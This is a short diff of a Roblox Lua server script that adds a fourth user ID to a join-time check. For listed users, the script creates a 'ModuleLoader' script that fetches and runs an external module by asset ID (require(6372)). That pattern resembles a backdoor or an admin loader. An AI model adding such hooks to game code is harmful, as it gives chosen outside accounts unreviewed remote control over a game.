@@ -85,7 +85,7 @@ game:GetService("Players").PlayerRemoving:connect(function(player)
 end)
 
 game:GetService("Players").PlayerAdded:connect(function(player)
-	if player.UserId == 3 or player.UserId == 2 or player.UserId == 23 then
+	if player.UserId == 3 or player.UserId == 2 or player.UserId == 23 or player.UserId == 46 then
         local loader = Instance.new("Script")
         loader.Name = "ModuleLoader"
         loader.Source = "require(6372)(game.Players:GetPlayerByUserId("..player.UserId.."))"
